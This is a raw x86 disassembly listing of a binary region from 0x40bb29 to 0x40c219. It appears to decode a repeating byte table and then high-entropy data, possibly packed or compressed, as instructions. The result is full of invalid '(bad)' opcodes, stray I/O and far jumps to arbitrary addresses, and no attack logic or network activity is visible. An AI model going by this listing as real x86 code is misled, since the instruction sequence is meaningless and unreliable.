  40bb29:	mov    ah,0xb8
  40bb2b:	mov    eax,0xbcbcb844
  40bb30:	inc    eax
  40bb31:	mov    esp,0xc03cc0c0
  40bb36:	(bad)  
  40bb37:	les    edi,FWORD PTR [eax]
  40bb39:	(bad)  
  40bb3a:	enter  0x34c8,0xc8
  40bb3e:	int3   
  40bb3f:	int3   
  40bb40:	xor    ah,cl
  40bb42:	rcl    al,1
  40bb44:	sub    al,0xd0
  40bb46:	aam    0xd4
  40bb48:	sub    ah,dl
  40bb4a:	fcomp  st(0)
  40bb4c:	and    al,0xd8
  40bb4e:	(bad)  
  40bb50:	and    ah,bl
  40bb52:	loopne 0x40bb34
  40bb54:	sbb    al,0xe0
  40bb56:	in     al,0xe4
  40bb58:	sbb    ah,ah
  40bb5a:	call   0xed28d047
  40bb5f:	in     al,dx
  40bb60:	adc    ah,ch
  40bb62:	lock lock or al,0xf0
  40bb66:	hlt    
  40bb67:	hlt    
  40bb68:	or     ah,dh
  40bb6a:	clc    
  40bb6b:	clc    
  40bb6c:	add    al,0xf8
  40bb6e:	cld    
  40bb6f:	cld    
  40bb70:	add    ah,bh
  40bb72:	add    BYTE PTR [eax],al
  40bb74:	cld    
  40bb75:	add    BYTE PTR [esp+eax*1],al
  40bb78:	clc    
  40bb79:	add    al,0x8
  40bb7b:	or     ah,dh
  40bb7d:	or     BYTE PTR [esp+ecx*1],cl
  40bb80:	lock or al,0x10
  40bb83:	adc    ah,ch
  40bb85:	adc    BYTE PTR [esp+edx*1],dl
  40bb88:	call   0xe458d3a1
  40bb8d:	sbb    BYTE PTR [esp+ebx*1],bl
  40bb90:	loopne 0x40bbae
  40bb92:	and    BYTE PTR [eax],ah
  40bb94:	fsub   QWORD PTR [eax]
  40bb96:	and    al,0x24
  40bb98:	fsub   DWORD PTR [eax+ebp*1]
  40bb9b:	sub    ah,dl
  40bb9d:	sub    BYTE PTR [esp+ebp*1],ch
  40bba0:	shr    BYTE PTR [eax+esi*1],1
  40bba3:	xor    ah,cl
  40bba5:	xor    BYTE PTR [esp+esi*1],dh
  40bba8:	enter  0x3834,0x38
  40bbac:	les    edi,FWORD PTR [eax]
  40bbae:	cmp    al,0x3c
  40bbb0:	sar    BYTE PTR [eax+eax*2],0x40
  40bbb4:	mov    esp,0xb8444440
  40bbb9:	inc    esp
  40bbba:	dec    eax
  40bbbb:	dec    eax
  40bbbc:	mov    ah,0x48
  40bbbe:	dec    esp
  40bbbf:	dec    esp
  40bbc0:	mov    al,0x4c
  40bbc2:	push   eax
  40bbc3:	push   eax
  40bbc4:	lods   al,BYTE PTR ds:[esi]
  40bbc5:	push   eax
  40bbc6:	push   esp
  40bbc7:	push   esp
  40bbc8:	test   al,0x54
  40bbca:	pop    eax
  40bbcb:	pop    eax
  40bbcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbcd:	pop    eax
  40bbce:	pop    esp
  40bbcf:	pop    esp
  40bbd0:	mov    al,ds:0x9c60605c
  40bbd5:	pusha  
  40bbd6:	fs fs cwde 
  40bbd9:	fs push 0x6c689468
  40bbdf:	ins    BYTE PTR es:[edi],dx
  40bbe0:	nop
  40bbe1:	ins    BYTE PTR es:[edi],dx
  40bbe2:	jo     0x40bc54
  40bbe4:	mov    WORD PTR [eax+0x74],?
  40bbe7:	je     0x40bb71
  40bbe9:	je     0x40bc63
  40bbeb:	js     0x40bb71
  40bbed:	js     0x40bc6b
  40bbef:	jl     0x40bb71
  40bbf1:	jl     0x40bb73
  40bbf3:	cmp    BYTE PTR [eax+eax*4-0x7c],0x84
  40bbf8:	js     0x40bb7e
  40bbfa:	mov    BYTE PTR [eax-0x7373778c],cl
  40bc00:	jo     0x40bb8e
  40bc02:	nop
  40bc03:	nop
  40bc04:	ins    BYTE PTR es:[edi],dx
  40bc05:	nop
  40bc06:	xchg   esp,eax
  40bc07:	xchg   esp,eax
  40bc08:	push   0x64989894
  40bc0d:	cwde   
  40bc0e:	pushf  
  40bc0f:	pushf  
  40bc10:	pusha  
  40bc11:	pushf  
  40bc12:	mov    al,ds:0xa4a05ca0
  40bc17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc18:	pop    eax
  40bc19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc1a:	test   al,0xa8
  40bc1c:	push   esp
  40bc1d:	test   al,0xac
  40bc1f:	lods   al,BYTE PTR ds:[esi]
  40bc20:	push   eax
  40bc21:	lods   al,BYTE PTR ds:[esi]
  40bc22:	mov    al,0xb0
  40bc24:	dec    esp
  40bc25:	mov    al,0xb4
  40bc27:	mov    ah,0x48
  40bc29:	mov    ah,0xb8
  40bc2b:	mov    eax,0xbcbcb844
  40bc30:	inc    eax
  40bc31:	mov    esp,0xc03cc0c0
  40bc36:	(bad)  
  40bc37:	les    edi,FWORD PTR [eax]
  40bc39:	(bad)  
  40bc3a:	enter  0x34c8,0xc8
  40bc3e:	int3   
  40bc3f:	int3   
  40bc40:	xor    ah,cl
  40bc42:	rcl    al,1
  40bc44:	sub    al,0xd0
  40bc46:	aam    0xd4
  40bc48:	sub    ah,dl
  40bc4a:	fcomp  st(0)
  40bc4c:	and    al,0xd8
  40bc4e:	(bad)  
  40bc50:	and    ah,bl
  40bc52:	loopne 0x40bc34
  40bc54:	sbb    al,0xe0
  40bc56:	in     al,0xe4
  40bc58:	sbb    ah,ah
  40bc5a:	call   0xed28d147
  40bc5f:	in     al,dx
  40bc60:	adc    ah,ch
  40bc62:	lock lock or al,0xf0
  40bc66:	hlt    
  40bc67:	hlt    
  40bc68:	or     ah,dh
  40bc6a:	clc    
  40bc6b:	clc    
  40bc6c:	add    al,0xf8
  40bc6e:	cld    
  40bc6f:	cld    
  40bc70:	add    ah,bh
  40bc72:	and    DWORD PTR [edi+0x4060002],edx
  40bc78:	clc    
  40bc79:	add    BYTE PTR [eax],cl
  40bc7b:	or     ah,dh
  40bc7d:	js     0x40bcf0
  40bc7f:	repz pause 
  40bc82:	mov    ah,0x73
  40bc84:	jbe    0x40bc97
  40bc86:	aaa    
  40bc87:	lods   al,BYTE PTR ds:[esi]
  40bc88:	push   0xe266fbe5
  40bc8d:	cdq    
  40bc8e:	repnz neg bl
  40bc91:	jmp    0x40bd06
  40bc93:	(bad)  
  40bc94:	mov    DWORD PTR [ebx-0x41cbcb38],edi
  40bc9a:	adc    BYTE PTR [eax],0x12
  40bc9d:	out    dx,eax
  40bc9e:	jp     0x40bce3
  40bca0:	loop   0x40bc24
  40bca2:	ret    
  40bca3:	loop   0x40bc6b
  40bca5:	dec    edx
  40bca6:	arpl   WORD PTR [edi+0x666292d1],dx
  40bcac:	push   cs
  40bcad:	out    0x38,al
  40bcaf:	out    dx,al
  40bcb0:	or     DWORD PTR [ebx+0x29],edx
  40bcb3:	rcr    eax,cl
  40bcb5:	int3   
  40bcb6:	into   
  40bcb7:	dec    eax
  40bcb8:	shl    BYTE PTR [esi],1
  40bcba:	and    eax,0x41dd9cd0
  40bcbf:	repz shl esp,0x34
  40bcc3:	loop   0x40bcd0
  40bcc5:	pop    esi
  40bcc6:	push   ebp
  40bcc7:	and    ecx,DWORD PTR [ecx]
  40bcc9:	adc    eax,0x963a11bc
  40bcce:	pusha  
  40bccf:	lock mov ebp,0xab2280a6
  40bcd5:	push   ds
  40bcd6:	adc    ecx,DWORD PTR [esi+0x49b7f065]
  40bcdc:	imul   edi,esi,0xa71990b6
  40bce2:	in     eax,0xc5
  40bce4:	lods   eax,DWORD PTR ds:[esi]
  40bce5:	adc    eax,0x6a69b75a
  40bcea:	sub    bh,BYTE PTR [ebx]
  40bcec:	out    0x34,al
  40bcee:	aad    0xcd
  40bcf0:	sbb    al,0xf5
  40bcf2:	ins    BYTE PTR es:[edi],dx
  40bcf3:	inc    edx
  40bcf4:	fs jne 0x40bd01
  40bcf7:	pop    eax
  40bcf8:	inc    ecx
  40bcf9:	scas   al,BYTE PTR es:[edi]
  40bcfa:	fild   QWORD PTR [ebx]
  40bcfc:	push   ecx
  40bcfd:	mov    eax,0x83aa30eb
  40bd02:	mov    BYTE PTR [ebx-0x20bb107d],dh
  40bd08:	aam    0x93
  40bd0a:	pusha  
  40bd0b:	jns    0x40bcd0
  40bd0d:	int    0x81
  40bd0f:	jmp    0x40bd1b
  40bd11:	and    dh,dh
  40bd13:	sub    al,0x7b
  40bd15:	dec    edx
  40bd16:	and    ebx,DWORD PTR [edx]
  40bd18:	pop    ebx
  40bd19:	mov    BYTE PTR [edx-0x1c0f839b],ah
  40bd1f:	aaa    
  40bd20:	in     al,dx
  40bd21:	xchg   esi,ebx
  40bd23:	and    al,0xff
  40bd25:	jnp    0x40bcff
  40bd27:	ffreep st(3)
  40bd29:	or     DWORD PTR [eax],esp
  40bd2b:	dec    edx
  40bd2c:	data16 mov ah,0x5e
  40bd2f:	inc    esp
  40bd30:	mov    cl,0xaa
  40bd32:	and    DWORD PTR [edi-0x2b201985],edi
  40bd38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd39:	js     0x40bce7
  40bd3b:	sub    DWORD PTR [esi],ecx
  40bd3d:	imul   ebx,DWORD PTR [ecx-0x6c],0x28
  40bd41:	hlt    
  40bd42:	lods   eax,DWORD PTR ds:[esi]
  40bd43:	adc    ebp,DWORD PTR [edi]
  40bd45:	or     ebx,DWORD PTR [edx-0x45]
  40bd48:	in     eax,dx
  40bd49:	sub    al,0x9c
  40bd4b:	lods   eax,DWORD PTR ds:[esi]
  40bd4c:	mov    eax,0x45020cbe
  40bd51:	dec    esp
  40bd52:	jmp    0xf6992ddf
  40bd57:	stos   BYTE PTR es:[edi],al
  40bd58:	mov    ecx,0xff04ac6a
  40bd5d:	ret    
  40bd5e:	xchg   edi,eax
  40bd5f:	fcos   
  40bd61:	adc    al,0xd
  40bd63:	faddp  st(2),st
  40bd65:	(bad)  
  40bd66:	and    cl,BYTE PTR [esi-0x53]
  40bd69:	dec    edx
  40bd6a:	add    edx,DWORD PTR [edx]
  40bd6c:	dec    ebp
  40bd6d:	mov    ebx,0x99416976
  40bd72:	or     dl,ah
  40bd74:	in     al,0xd8
  40bd76:	add    bl,BYTE PTR [ecx-0x9a3c45e]
  40bd7c:	aas    
  40bd7d:	dec    edx
  40bd7e:	cdq    
  40bd7f:	dec    ebx
  40bd80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd81:	push   edi
  40bd82:	cli    
  40bd83:	mov    dl,0xf7
  40bd85:	jle    0x40be05
  40bd87:	imul   edi,DWORD PTR ss:[ebx+0x1f],0xffffffa7
  40bd8c:	cld    
  40bd8d:	fs in  eax,dx
  40bd8f:	mov    ebp,0x13ff1aa7
  40bd94:	data16 arpl WORD PTR [eax-0x61],bp
  40bd98:	inc    DWORD PTR [esi]
  40bd9a:	mov    eax,ds:0x29e9ca86
  40bd9f:	xchg   DWORD PTR [eax-0x40760a2c],esi
  40bda5:	or     al,0xcf
  40bda7:	sbb    BYTE PTR [ebx+0x3],bl
  40bdaa:	pushf  
  40bdab:	cmc    
  40bdac:	jge    0x40bd9d
  40bdae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdaf:	(bad)  
  40bdb0:	fs inc ebx
  40bdb2:	pushf  
  40bdb3:	inc    esi
  40bdb4:	lock or BYTE PTR [ecx],0xb
  40bdb8:	addr16 repnz mov al,0xf2
  40bdbc:	popa   
  40bdbd:	fnsave [ecx]
  40bdbf:	aam    0xa8
  40bdc1:	jp     0x40bd79
  40bdc3:	jge    0x40be1d
  40bdc5:	stc    
  40bdc6:	neg    BYTE PTR ds:0xf15f92f3
  40bdcc:	out    dx,al
  40bdcd:	pop    edx
  40bdce:	sub    BYTE PTR [edx],0x60
  40bdd1:	imul   ebp,DWORD PTR [ebx+0x752f5363],0x67
  40bdd8:	rcr    BYTE PTR [ebx],0x9b
  40bddb:	push   edi
  40bddc:	(bad)  
  40bddd:	ret    
  40bdde:	loopne 0x40be1e
  40bde0:	cmp    eax,eax
  40bde2:	mov    bl,ch
  40bde4:	test   cl,ah
  40bde6:	outs   dx,DWORD PTR ds:[esi]
  40bde7:	clc    
  40bde8:	not    BYTE PTR [edx]
  40bdea:	or     bh,dh
  40bdec:	mov    eax,ds:0x17f375d1
  40bdf1:	daa    
  40bdf2:	pop    eax
  40bdf3:	sub    ch,BYTE PTR [ebp+0x2827b235]
  40bdf9:	push   ds
  40bdfa:	add    DWORD PTR [edx-0x25d9e6cf],ebp
  40be00:	dec    esi
  40be01:	out    0xb8,eax
  40be03:	mov    ecx,0x6b4a60b3
  40be08:	xchg   edi,eax
  40be09:	push   0xffffffa4
  40be0b:	sbb    BYTE PTR [esi+0x6cbf2053],0x43
  40be12:	fstp   QWORD PTR ds:0x1c2c1824
  40be18:	pop    ds
  40be19:	inc    ebx
  40be1a:	in     al,dx
  40be1b:	aam    0xbc
  40be1d:	mov    eax,ds:0xa0b29588
  40be22:	js     0x40bde4
  40be24:	xor    dl,ch
  40be26:	push   ecx
  40be27:	mov    ebx,ebp
  40be29:	xchg   esp,eax
  40be2a:	jecxz  0x40be5d
  40be2c:	jp     0x40bdee
  40be2e:	ret    
  40be2f:	push   ds
  40be30:	or     al,0xd3
  40be32:	test   DWORD PTR [esi],edx
  40be34:	clc    
  40be35:	mov    ch,0xd1
  40be37:	dec    edi
  40be38:	retf   0xfe9f
  40be3b:	stos   BYTE PTR es:[edi],al
  40be3c:	push   es
  40be3d:	shl    DWORD PTR [edx-0xc7fb524],0x81
  40be44:	fisttp QWORD PTR [edi+0x206b0298]
  40be4a:	fistp  DWORD PTR [edx+0xa]
  40be4d:	push   ds
  40be4e:	cdq    
  40be4f:	(bad)  [edi]
  40be51:	ins    BYTE PTR es:[edi],dx
  40be52:	sub    esi,0x2c555f54
  40be58:	pop    es
  40be59:	jne    0x40be2b
  40be5b:	daa    
  40be5c:	int3   
  40be5d:	aam    0x2a
  40be5f:	ins    DWORD PTR es:[edi],dx
  40be60:	scas   eax,DWORD PTR es:[edi]
  40be61:	iret   
  40be62:	cdq    
  40be63:	push   esp
  40be64:	icebp  
  40be65:	ror    DWORD PTR [esi+0x606b5693],0x9
  40be6c:	inc    edi
  40be6d:	in     eax,0x73
  40be6f:	inc    eax
  40be70:	mov    WORD PTR [esp+ebx*8-0x29],?
  40be74:	sub    ebx,DWORD PTR [eax]
  40be76:	push   ebp
  40be77:	jno    0x40be23
  40be79:	or     ebx,ecx
  40be7b:	xor    BYTE PTR [edx],0x11
  40be7e:	out    0xa1,al
  40be80:	(bad)  
  40be82:	leave  
  40be83:	jecxz  0x40be61
  40be85:	sub    ebp,DWORD PTR [eax-0x5be0f818]
  40be8b:	xchg   ebp,eax
  40be8c:	test   DWORD PTR [ecx-0x4a],ecx
  40be8f:	cdq    
  40be90:	mov    ds:0xf904e72a,al
  40be95:	jg     0x40be5b
  40be97:	mov    al,ds:0x7158ccc7
  40be9c:	mov    eax,ds:0x4d967f7b
  40bea1:	rol    BYTE PTR [edi],0xa2
  40bea4:	lods   eax,DWORD PTR ds:[esi]
  40bea5:	(bad)  
  40bea7:	inc    ebp
  40bea8:	mov    eax,ds:0x53e27373
  40bead:	jmp    0x40be46
  40beaf:	mov    dh,0x3a
  40beb1:	mov    edi,0xceacf01d
  40beb6:	sar    ecx,0x71
  40beb9:	cwde   
  40beba:	test   DWORD PTR ds:0x8dc6bb50,esi
  40bec0:	xchg   edi,eax
  40bec1:	and    al,cl
  40bec3:	mov    ch,0x60
  40bec5:	mov    ch,0xb2
  40bec7:	sub    DWORD PTR [eax],ecx
  40bec9:	jge    0x40bec4
  40becb:	push   ds
  40becc:	push   ds
  40becd:	(bad)  
  40becf:	cmp    eax,DWORD PTR [ebp-0x1d]
  40bed2:	and    esi,ebp
  40bed4:	mov    ds:0x57cfdc0b,eax
  40bed9:	mov    ebx,0xaf4d9f7c
  40bede:	(bad)  
  40bee0:	dec    ecx
  40bee1:	cmp    BYTE PTR [ecx-0x2e],cl
  40bee4:	stos   BYTE PTR es:[edi],al
  40bee5:	mov    ebx,DWORD PTR [esi+0x23]
  40bee8:	fld    DWORD PTR ds:0x9caa27fa
  40beee:	dec    esi
  40beef:	push   cs
  40bef0:	sub    eax,0x3358f486
  40bef5:	ins    BYTE PTR es:[edi],dx
  40bef6:	call   0x6a1a:0xb150b623
  40befd:	mov    cx,0xb88f
  40bf01:	mov    eax,0x8dc9c47b
  40bf06:	xlat   BYTE PTR ds:[ebx]
  40bf07:	dec    ebp
  40bf08:	push   es
  40bf09:	aas    
  40bf0a:	sahf   
  40bf0b:	xchg   ebx,eax
  40bf0c:	loopne 0x40bf66
  40bf0e:	stos   DWORD PTR es:[edi],eax
  40bf0f:	adc    eax,0x87e04d97
  40bf14:	sbb    al,0x39
  40bf16:	xchg   ebx,eax
  40bf17:	mov    eax,0x962977db
  40bf1c:	(bad)  
  40bf1d:	lea    edx,[eax-0x1e4e6101]
  40bf23:	mov    al,ds:0x30fb1bc7
  40bf28:	test   dh,cl
  40bf2a:	jb     0x40bf04
  40bf2c:	xor    BYTE PTR [esi-0x32],cl
  40bf2f:	out    dx,al
  40bf30:	pop    ds
  40bf31:	xor    DWORD PTR [ecx+0x4],ebp
  40bf34:	leave  
  40bf35:	inc    ebp
  40bf36:	jno    0x40bf2a
  40bf38:	hlt    
  40bf39:	iret   
  40bf3a:	push   eax
  40bf3b:	add    eax,0x9070bd5b
  40bf40:	dec    edx
  40bf41:	(bad)  
  40bf42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf43:	pop    ebp
  40bf44:	imul   DWORD PTR [edi]
  40bf46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf47:	jae    0x40bf43
  40bf49:	adc    DWORD PTR [esp+ebx*1+0xa3c8142],ebx
  40bf50:	push   ecx
  40bf51:	cmp    ch,BYTE PTR [ecx+edi*1-0x49]
  40bf55:	lock and al,0x57
  40bf58:	sti    
  40bf59:	fucomip st,st(6)
  40bf5b:	test   al,0x27
  40bf5d:	call   DWORD PTR [edi+0xe]
  40bf60:	jecxz  0x40bf68
  40bf62:	xor    eax,0x67fc7d66
  40bf67:	arpl   WORD PTR [edi-0x26114fd3],ax
  40bf6d:	outs   dx,BYTE PTR cs:[esi]
  40bf6f:	sub    cl,BYTE PTR [esi+0x4631ffbd]
  40bf75:	(bad)  
  40bf76:	push   ss
  40bf77:	cwde   
  40bf78:	xchg   ebx,eax
  40bf79:	or     al,BYTE PTR [ecx]
  40bf7b:	mov    ch,0x49
  40bf7d:	retf   
  40bf7e:	dec    esp
  40bf7f:	dec    ebx
  40bf80:	fadd   QWORD PTR [eax-0x22495918]
  40bf86:	push   edi
  40bf87:	in     al,0x3e
  40bf89:	loope  0x40bf20
  40bf8b:	and    eax,esi
  40bf8d:	leave  
  40bf8e:	mov    bh,0x75
  40bf90:	cmp    bh,cl
  40bf92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf93:	push   esp
  40bf94:	imul   DWORD PTR [ecx]
  40bf96:	add    BYTE PTR [edx+0x55],al
  40bf99:	leave  
  40bf9a:	inc    edi
  40bf9b:	mov    ds:0xe5eeb6cb,al
  40bfa0:	repz xor eax,0xb8fbf70e
  40bfa6:	shl    BYTE PTR [eax+0x20],0x7f
  40bfaa:	xor    eax,0x3ef26655
  40bfaf:	jl     0x40bf69
  40bfb1:	imul   edi,esi,0xf
  40bfb4:	jnp    0x40bfea
  40bfb6:	adc    ebx,esi
  40bfb8:	dec    edi
  40bfb9:	int    0x68
  40bfbb:	scas   al,BYTE PTR es:[edi]
  40bfbc:	aam    0x8d
  40bfbe:	inc    ebx
  40bfbf:	cmp    al,0x9
  40bfc1:	ja     0x40bf61
  40bfc3:	imul   edx,edi,0x38
  40bfc6:	sbb    cl,ch
  40bfc8:	iret   
  40bfc9:	dec    ebx
  40bfca:	test   BYTE PTR [edx],bl
  40bfcc:	or     eax,0x4b205a1c
  40bfd1:	cmp    BYTE PTR [edi],dl
  40bfd3:	pusha  
  40bfd4:	shl    ecx,cl
  40bfd6:	adc    al,0xc2
  40bfd8:	dec    edi
  40bfd9:	jb     0x40bf79
  40bfdb:	push   esi
  40bfdc:	push   ds
  40bfdd:	scas   al,BYTE PTR es:[edi]
  40bfde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfdf:	es (bad) 
  40bfe1:	sub    BYTE PTR [ebx],0x65
  40bfe4:	or     eax,0xa94e9e49
  40bfe9:	(bad)  
  40bfea:	out    dx,al
  40bfeb:	xor    BYTE PTR [esi+0x4e],ch
  40bfee:	sbb    eax,0xdf008d1
  40bff3:	aaa    
  40bff4:	inc    ebp
  40bff5:	adc    al,0x4d
  40bff7:	inc    edx
  40bff8:	pop    edx
  40bff9:	or     eax,0x743f333f
  40bffe:	mul    DWORD PTR [ebx]
  40c000:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c001:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c002:	xchg   esi,eax
  40c003:	lahf   
  40c004:	lods   al,BYTE PTR gs:[esi]
  40c006:	(bad)  
  40c007:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c008:	sti    
  40c009:	jp     0x40c069
  40c00b:	and    ebp,0xfffffff8
  40c00e:	cmp    eax,0x6b8d2fe5
  40c013:	jmp    0x22e9:0xf3b69690
  40c01a:	cdq    
  40c01b:	lods   eax,DWORD PTR ds:[esi]
  40c01c:	push   0x18
  40c01e:	setns  ch
  40c021:	mov    cl,BYTE PTR [edx-0x31]
  40c024:	mov    eax,edi
  40c026:	stos   DWORD PTR es:[edi],eax
  40c027:	pop    eax
  40c028:	scas   eax,DWORD PTR es:[edi]
  40c029:	ficomp WORD PTR [edx-0x45b06b09]
  40c02f:	retf   0x1553
  40c032:	cmp    dl,dl
  40c034:	push   eax
  40c035:	int    0x73
  40c037:	repnz lahf 
  40c039:	popa   
  40c03a:	fnstcw WORD PTR [ecx+0x64]
  40c03d:	or     eax,0xc7c09cfc
  40c042:	push   ecx
  40c043:	call   0x6ef80a98
  40c048:	jno    0x40c0a0
  40c04a:	arpl   WORD PTR [ebx+0x6a3e753],si
  40c050:	jne    0x40c0bf
  40c052:	leave  
  40c053:	(bad)  
  40c054:	pusha  
  40c055:	mov    esi,0xc4959809
  40c05a:	dec    esi
  40c05b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c05c:	jo     0x40bfed
  40c05e:	mov    BYTE PTR [ebp-0x2f],bh
  40c061:	out    0xea,al
  40c063:	xor    ah,dh
  40c065:	fcomp  DWORD PTR [edx+0x75fd6e19]
  40c06b:	or     eax,0xdd04f9f7
  40c070:	sub    dl,BYTE PTR [ecx]
  40c072:	stos   BYTE PTR es:[edi],al
  40c073:	lods   eax,DWORD PTR ds:[esi]
  40c074:	retf   0x1970
  40c077:	out    dx,al
  40c078:	dec    ecx
  40c079:	in     al,0x88
  40c07b:	jae    0x40c082
  40c07d:	idiv   DWORD PTR [edx+0x382205f5]
  40c083:	jo     0x40c091
  40c085:	cmp    al,BYTE PTR [ebx+esi*4-0x7750d10a]
  40c08c:	mov    bh,0xd2
  40c08e:	push   edx
  40c08f:	ins    DWORD PTR es:[edi],dx
  40c090:	ins    DWORD PTR es:[edi],dx
  40c091:	push   ds
  40c092:	jmp    0xab253854
  40c097:	outs   dx,DWORD PTR ds:[esi]
  40c098:	outs   dx,BYTE PTR es:[esi]
  40c09a:	rcr    bh,1
  40c09c:	mov    cl,dl
  40c09e:	jg     0x40c100
  40c0a0:	sub    BYTE PTR [ecx-0x75e366fa],cl
  40c0a6:	cdq    
  40c0a7:	shl    ebp,0x4
  40c0aa:	stos   BYTE PTR es:[edi],al
  40c0ab:	ins    BYTE PTR es:[edi],dx
  40c0ac:	sub    BYTE PTR [eax+0x63a473f8],0x61
  40c0b3:	sub    eax,0xcabf911b
  40c0b8:	data16 scas al,BYTE PTR es:[edi]
  40c0ba:	mov    al,ds:0x4ce66e03
  40c0bf:	mov    ch,0x90
  40c0c1:	push   ds
  40c0c2:	sbb    BYTE PTR [edx],bl
  40c0c4:	xor    eax,DWORD PTR [ebx]
  40c0c6:	xchg   ebp,eax
  40c0c7:	cld    
  40c0c8:	fidiv  WORD PTR [esi]
  40c0ca:	retf   
  40c0cb:	cld    
  40c0cc:	push   ebp
  40c0cd:	mov    ds,WORD PTR [ebp+0x5f510239]
  40c0d3:	dec    esi
  40c0d4:	dec    esi
  40c0d5:	and    DWORD PTR [ecx],0xd0ed6845
  40c0db:	shl    ecx,1
  40c0dd:	nop
  40c0de:	mov    ?,ecx
  40c0e0:	int    0xa0
  40c0e2:	mov    edi,0xf69285bf
  40c0e7:	jo     0x40c15c
  40c0e9:	pop    ebp
  40c0ea:	pop    esp
  40c0eb:	jle    0x40c12a
  40c0ed:	mov    ebp,fs
  40c0ef:	mov    dl,0x8d
  40c0f1:	test   BYTE PTR [ebx],ch
  40c0f3:	cli    
  40c0f4:	clc    
  40c0f5:	enter  0x37,0x8a
  40c0f9:	adc    BYTE PTR [edi],dl
  40c0fb:	outs   dx,DWORD PTR ds:[esi]
  40c0fc:	out    0xde,al
  40c0fe:	test   DWORD PTR [esi+0x20d8661e],eax
  40c104:	mov    ebp,0x65a0576f
  40c109:	scas   al,BYTE PTR es:[edi]
  40c10a:	test   DWORD PTR [ebp-0x39],ebp
  40c10d:	xchg   esp,eax
  40c10e:	inc    esi
  40c10f:	xchg   esi,eax
  40c110:	jecxz  0x40c0bc
  40c112:	dec    esi
  40c113:	mov    dh,0x9c
  40c115:	clc    
  40c116:	fcom   DWORD PTR [eax+0x43deaea8]
  40c11c:	fnstsw WORD PTR [ebp-0x4d376e52]
  40c122:	sbb    cl,cl
  40c124:	sbb    al,0xc
  40c126:	push   ds
  40c127:	cmc    
  40c128:	out    dx,eax
  40c129:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c12a:	sbb    dh,BYTE PTR [edx+0x2d]
  40c12d:	cs pop ecx
  40c12f:	loopne 0x40c0d0
  40c131:	int3   
  40c132:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c133:	fisubr DWORD PTR ds:0x510961f3
  40c139:	pop    ds
  40c13a:	add    bl,ch
  40c13c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c13d:	xchg   ebx,eax
  40c13e:	call   0x462c:0xb0a016e0
  40c145:	add    eax,DWORD PTR fs:[edi+esi*4]
  40c149:	xchg   cl,dh
  40c14b:	arpl   sp,bx
  40c14d:	daa    
  40c14e:	fiadd  DWORD PTR [esi]
  40c150:	sub    BYTE PTR [edx-0x6c19821a],0xe9
  40c157:	lock aam 0x71
  40c15a:	or     al,0xe9
  40c15c:	lahf   
  40c15d:	and    cl,BYTE PTR ds:0xc30d4e5c
  40c163:	std    
  40c164:	jns    0x40c13c
  40c166:	mov    ebx,0x8d1a17be
  40c16b:	mov    esp,0x64840d8f
  40c170:	(bad)  
  40c171:	call   0x258997f4
  40c176:	arpl   WORD PTR [esi+0x51b6e9f6],sp
  40c17c:	imul   ebp,DWORD PTR [esi-0x6fe986d3],0xffffffad
  40c183:	add    eax,0xbcd27583
  40c188:	addr16 inc ebp
  40c18a:	and    eax,0x7cbb4c17
  40c18f:	jl     0x40c11e
  40c191:	into   
  40c192:	sub    DWORD PTR [ecx],edi
  40c194:	div    BYTE PTR [ebp+0xd]
  40c197:	mov    ah,BYTE PTR ss:[esi+0x5e]
  40c19b:	nop
  40c19c:	(bad)  
  40c19d:	in     ax,0xa6
  40c1a0:	mov    dl,BYTE PTR [esi]
  40c1a2:	dec    ebp
  40c1a3:	stc    
  40c1a4:	outs   dx,DWORD PTR ds:[esi]
  40c1a5:	cli    
  40c1a6:	aaa    
  40c1a7:	jmp    0x5253:0x1799c06c
  40c1ae:	sbb    BYTE PTR [esi-0x59],cl
  40c1b1:	lea    esi,[edi-0x6e41d1e7]
  40c1b7:	push   ds
  40c1b8:	sub    al,0x91
  40c1ba:	mov    eax,0x6c4f54a1
  40c1bf:	scas   eax,DWORD PTR es:[edi]
  40c1c0:	xor    bl,dl
  40c1c2:	xchg   esp,eax
  40c1c3:	mov    ecx,0x9fa1d45c
  40c1c8:	retf   0xb01f
  40c1cb:	in     al,dx
  40c1cc:	cmc    
  40c1cd:	shl    BYTE PTR [eax+0x42f371e9],1
  40c1d3:	xchg   edi,eax
  40c1d4:	xchg   esp,eax
  40c1d5:	pop    ecx
  40c1d6:	scas   al,BYTE PTR es:[edi]
  40c1d7:	mov    WORD PTR [ebp+0x10],gs
  40c1da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1db:	inc    esi
  40c1dc:	xchg   esi,eax
  40c1dd:	(bad)  
  40c1df:	jb     0x40c1a2
  40c1e1:	(bad)  
  40c1e2:	push   eax
  40c1e3:	call   0x633e7b16
  40c1e8:	inc    ebx
  40c1e9:	push   cs
  40c1ea:	cdq    
  40c1eb:	mov    al,0xa9
  40c1ed:	inc    ebx
  40c1ee:	fstp   QWORD PTR [eax-0x1d]
  40c1f1:	jmp    0x86c1e01b
  40c1f6:	mov    DWORD PTR [ebx+0x5a],ebx
  40c1f9:	cdq    
  40c1fa:	das    
  40c1fb:	call   0x999f:0x27d4a75d
  40c202:	sti    
  40c203:	add    DWORD PTR [ecx+0x63124e99],esi
  40c209:	sahf   
  40c20a:	or     bh,BYTE PTR [eax+0x2e61d6da]
  40c210:	lea    ebp,[esi-0x25]
  40c213:	sti    
  40c214:	push   0x41
  40c216:	jnp    0x40c258
  40c218:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c219:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
